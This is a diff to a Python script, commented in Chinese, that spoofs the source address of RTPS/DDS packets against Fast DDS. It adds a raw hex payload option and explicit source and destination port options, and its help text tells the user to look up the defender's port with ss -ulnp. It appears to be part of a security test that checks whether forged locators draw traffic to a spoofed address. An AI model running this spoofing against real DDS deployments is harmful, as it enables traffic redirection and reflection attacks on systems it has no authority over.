@@ -173,8 +173,20 @@ def rewrite_locators(
 
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--template", type=Path, required=True,
-                        help="含有攻擊者 RTPS 封包的擷取檔，用來取樣板")
+    parser.add_argument("--template", type=Path, default=None,
+                        help="含有攻擊者 RTPS 封包的擷取檔，用來取樣板"
+                             "（需要 tshark）")
+    parser.add_argument("--template-hex", default=None,
+                        help="直接給 UDP 酬載的十六進位。攻擊機因此不需要 "
+                             "tshark 也不需要擷取檔——只要 Python 與 root。")
+    parser.add_argument("--dest-port", type=int, default=None,
+                        help="**通常必須指定。** 樣板裡的目的埠是取樣當時"
+                             "防守方 participant 的埠，換一次 session 就會變。"
+                             "送錯埠 Fast DDS 不會反應，於是沒有任何送往被"
+                             "偽造位址的流量，測到的會是「無法驗證」而不是"
+                             "「確證偽造」。用 ss -ulnp 在防守方查實際的埠。")
+    parser.add_argument("--source-port", type=int, default=None,
+                        help="偽造封包的來源埠，預設沿用樣板的")
     parser.add_argument("--attacker-ip", required=True,
                         help="攻擊機真正的 IPv4（要被換掉的那個）")
     parser.add_argument("--spoof-ip", required=True,
@@ -219,7 +231,34 @@ def main() -> int:
         print("⛔ 需要 root：偽造來源位址要 raw socket", file=sys.stderr)
         return 2
 
-    payload, sport, dport = extract_template(args.template, args.attacker_ip)
+    if args.template_hex:
+        try:
+            payload = bytes.fromhex(args.template_hex.replace(":", "").strip())
+        except ValueError:
+            print("⛔ --template-hex 不是合法的十六進位", file=sys.stderr)
+            return 2
+        if payload[:4] != b"RTPS":
+            print("⛔ 酬載開頭不是 RTPS。這不是一個 RTPS 資料包。",
+                  file=sys.stderr)
+            return 2
+        sport, dport = 47470, 0
+    elif args.template is not None:
+        payload, sport, dport = extract_template(
+            args.template, args.attacker_ip
+        )
+    else:
+        print("⛔ 要 --template 或 --template-hex 其中一個", file=sys.stderr)
+        return 2
+
+    if args.source_port:
+        sport = args.source_port
+    if args.dest_port:
+        dport = args.dest_port
+    if not dport:
+        print("⛔ 沒有目的埠。用 --dest-port 指定。", file=sys.stderr)
+        print("   在防守方查：ss -ulnp | grep -E ':(149|74)[0-9]{2}'",
+              file=sys.stderr)
+        return 2
     spoofed, replaced = rewrite_locators(
         payload, args.attacker_ip, args.spoof_ip
     )
@@ -233,7 +272,8 @@ def main() -> int:
         return 1
 
     print("=== N31 來源位址偽造 ===")
-    print(f"  樣板      : {args.template}（{len(payload)} bytes，"
+    source = args.template if args.template else "--template-hex"
+    print(f"  樣板      : {source}（{len(payload)} bytes，"
           f"{args.attacker_ip}:{sport} → :{dport}）")
     print(f"  酬載內 locator 替換：{replaced} 處")
     print(f"  偽造來源  : {args.spoof_ip}")
